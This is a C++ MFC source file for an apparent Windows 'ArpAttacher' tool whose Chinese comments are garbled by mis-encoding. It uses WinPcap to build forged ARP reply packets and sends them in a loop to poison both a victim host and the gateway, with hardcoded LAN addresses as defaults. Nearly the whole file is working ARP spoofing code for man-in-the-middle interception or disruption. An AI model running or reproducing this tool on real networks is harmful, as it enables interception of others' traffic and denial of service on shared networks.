
// ArpAttacherDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "ArpAttacher.h"
#include "ArpAttacherDlg.h"


#pragma comment(lib,"wpcap.lib")
#pragma comment(lib,"ws2_32.lib")



#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CArpAttacherDlg �Ի���

CArpAttacherDlg::CArpAttacherDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CArpAttacherDlg::IDD, pParent)
	, m_iFreq(0)
	, m_strAttackIp(_T(""))
	, m_strAttackMac(_T(""))
	, m_strGateWayIp(_T(""))
	, m_strGateWayMac(_T(""))
	, m_strFalseIp(_T(""))
	, m_strFalseMac(_T(""))
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	this->dev_handle=NULL;
	this->alldevs=NULL;
	this->m_bStop=FALSE;
}

void CArpAttacherDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);

	DDX_Text(pDX, IDC_FREQ, m_iFreq);
	DDX_Text(pDX, IDC_ATTACK_IP, m_strAttackIp);
	DDX_Text(pDX, IDC_ATTACK_MAC, m_strAttackMac);
	DDX_Text(pDX, IDC_GATEWAY_IP, m_strGateWayIp);
	DDX_Text(pDX, IDC_GATEWAY_MAC, m_strGateWayMac);
	DDX_Text(pDX, IDC_FALSE_IP, m_strFalseIp);
	DDX_Text(pDX, IDC_FALSE_MAC, m_strFalseMac);
	DDX_Control(pDX, IDC_IFLIST, m_ifList);
}

BEGIN_MESSAGE_MAP(CArpAttacherDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_OK, &CArpAttacherDlg::OnBnClickedOk)
	ON_WM_CLOSE()
	ON_WM_DESTROY()
	ON_BN_CLICKED(IDC_CANCEL, &CArpAttacherDlg::OnBnClickedCancel)
END_MESSAGE_MAP()


// CArpAttacherDlg ��Ϣ�������

BOOL CArpAttacherDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

    pcap_if_t *d;
    char errbuf[PCAP_ERRBUF_SIZE];
  
    /* ���API����������� ���б� */
    if (pcap_findalldevs(&alldevs, errbuf) == -1)
    {
		this->MessageBox(TEXT("����������Ϣʧ�ܣ�"));
		return FALSE;
    }

	for(d=alldevs;d;d=d->next)
	{
		char szIfInfo[512];
		sprintf(szIfInfo,"%s(%s)",d->name,d->description==NULL ? "������":d->description);
		m_ifList.InsertString(-1,szIfInfo);
	}
	if(m_ifList.GetCount() >0)
	{
		m_ifList.SetCurSel(0);
	}

	//this->m_strAttackIp="192.168.30.105";
	//this->m_strAttackMac="50-e5-49-4c-e0-6f";

	this->m_strAttackIp="192.168.30.129";
	this->m_strAttackMac="00-22-b0-e1-63-98";

	//this->m_strGateWayIp="192.168.30.1";
	//this->m_strGateWayMac="00-0f-e2-4c-7c-c6";

	this->m_strGateWayIp="192.168.30.1";
	this->m_strGateWayMac="00-0f-e2-4c-7c-c6";  //00-0f-e2-4c-7c-c6

	this->m_strFalseIp ="192.168.30.131";
	this->m_strFalseMac ="90-2B-34-02-39-91";

	this->UpdateData(FALSE);

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CArpAttacherDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CArpAttacherDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

BOOL GetMacByString(unsigned char *szMac,CString &str)
{
	if(str.GetLength() !=17)
	{
		return FALSE;
	}
	for(int i=0;i<6;i++)
	{
	    szMac[i]= _tcstol(str.Mid(i*3,2),NULL,16);
	}
	return TRUE;
}


DWORD Fun_Thread(LPVOID lpPara)
{
	CArpAttacherDlg *pThis=(CArpAttacherDlg *)lpPara;
	if(pThis->m_iFreq <=0 || pThis->m_iFreq>1000)
	{
		pThis->m_iFreq=1;
	}

	int isleep=1000/pThis->m_iFreq;
	DWORD dwTimes=0;
	char szTimes[32];
	while(!pThis->m_bStop)
	{
	 
		int ret=pcap_sendpacket(pThis->dev_handle,(const u_char *)&pThis->m_Packet1,sizeof(ARPPACKET));
		ret=pcap_sendpacket(pThis->dev_handle,(const u_char *)&pThis->m_Packet2,sizeof(ARPPACKET));
		sprintf(szTimes,"%u��",++dwTimes);
		pThis->GetDlgItem(IDC_COUNT)->SetWindowTextA(szTimes);

		::Sleep(isleep);
	}
	pThis->GetDlgItem(IDC_OK)->EnableWindow(TRUE);
	return 0;
 
}
void CArpAttacherDlg::OnBnClickedOk()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	if(this->dev_handle !=NULL)
	{
		pcap_close(this->dev_handle);
		this->dev_handle=NULL;

	}
	 
    int iSel=m_ifList.GetCurSel();
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *d=alldevs;
	for(int i=0;i<iSel;i++)
	{
		d=d->next;
	}

	if ((dev_handle= pcap_open_live(d->name,          // �豸��
    65536,            // 65535��֤�ܲ��񵽲�ͬ������·���ϵ�ÿ�����ݰ���ȫ������
    0,    // ����ģʽ
    1000,             // ��ȡ��ʱʱ��
    errbuf            // ���󻺳��
    )) == NULL)
	{
		this->MessageBox("��ָ������ʧ�ܣ�");
		return;
	}
	CString str("00-11-22-33-44-55");

	this->UpdateData();
	//Packet1
	GetMacByString(m_Packet1.dlcHeader.DesMAC, this->m_strAttackMac);
	GetMacByString(m_Packet1.dlcHeader.SrcMAC, this->m_strFalseMac);
	m_Packet1.dlcHeader.Ethertype=htons((unsigned short)0x0806);

	m_Packet1.arpFrame.HW_Type=htons((unsigned short)1);         //Ӳ������Ϊ��̫������
	m_Packet1.arpFrame.HW_Addr_Len=(unsigned char)0x6;           //��̫��MAC��ַ����Ϊ6
    m_Packet1.arpFrame.Opcode=htons((unsigned short)0x02);       //1Ϊ�����룬2ΪӦ����

	m_Packet1.arpFrame.Prot_Addr_Len=(unsigned char)0x4;        //IP��ַ����Ϊ 4
	m_Packet1.arpFrame.Prot_Type=htons((unsigned short)0x0800); //�ϲ�Э��ΪipЭ��
 
	GetMacByString(m_Packet1.arpFrame.Send_HW_Addr,this->m_strFalseMac);  
	m_Packet1.arpFrame.Send_Prot_Addr=inet_addr(this->m_strGateWayIp.GetBuffer());
	
	GetMacByString(m_Packet1.arpFrame.Targ_HW_Addr,this->m_strAttackMac);
	m_Packet1.arpFrame.Targ_Prot_Addr=inet_addr(this->m_strAttackIp.GetBuffer());
	
    memset(m_Packet1.arpFrame.padding,0,sizeof(m_Packet1.arpFrame.padding));



    //Packet1
	GetMacByString(m_Packet2.dlcHeader.DesMAC,this->m_strGateWayMac);
	GetMacByString(m_Packet2.dlcHeader.SrcMAC,this->m_strFalseMac);
	m_Packet2.dlcHeader.Ethertype=htons((unsigned short)0x0806);

	m_Packet2.arpFrame.HW_Type=htons((unsigned short)1);//Ӳ������Ϊ��̫������
	m_Packet2.arpFrame.HW_Addr_Len=(unsigned char)0x6;  //��̫��MAC��ַ����Ϊ6
    m_Packet2.arpFrame.Opcode=htons((unsigned short)0x02);//1Ϊ�����룬2ΪӦ����

	m_Packet2.arpFrame.Prot_Addr_Len=(unsigned char)0x4;//IP��ַ����Ϊ 4
	m_Packet2.arpFrame.Prot_Type=htons((unsigned short)0x0800);//�ϲ�Э��ΪipЭ��
 
	GetMacByString(m_Packet2.arpFrame.Send_HW_Addr,this->m_strFalseMac);
	m_Packet2.arpFrame.Send_Prot_Addr=inet_addr(this->m_strAttackIp.GetBuffer());
	
	GetMacByString(m_Packet2.arpFrame.Targ_HW_Addr,this->m_strGateWayMac);
	m_Packet2.arpFrame.Targ_Prot_Addr=inet_addr(this->m_strGateWayIp.GetBuffer());
	
    memset(m_Packet2.arpFrame.padding,0,sizeof(m_Packet1.arpFrame.padding));


	
	HANDLE h1=::CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)Fun_Thread,this,0,NULL);
	::CloseHandle(h1);
	this->m_bStop =FALSE;
	this->GetDlgItem(IDC_OK)->EnableWindow(FALSE);

}

void CArpAttacherDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ

	
	CDialog::OnClose();
}

void CArpAttacherDlg::OnDestroy()
{
	if(this->alldevs !=NULL)
	{
		::pcap_freealldevs(alldevs);
	}
	if(this->dev_handle !=NULL)
	{
		pcap_close(this->dev_handle);
	}
	CDialog::OnDestroy();

	// TODO: �ڴ˴������Ϣ����������
}

void CArpAttacherDlg::OnBnClickedCancel()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	this->m_bStop=TRUE;
}
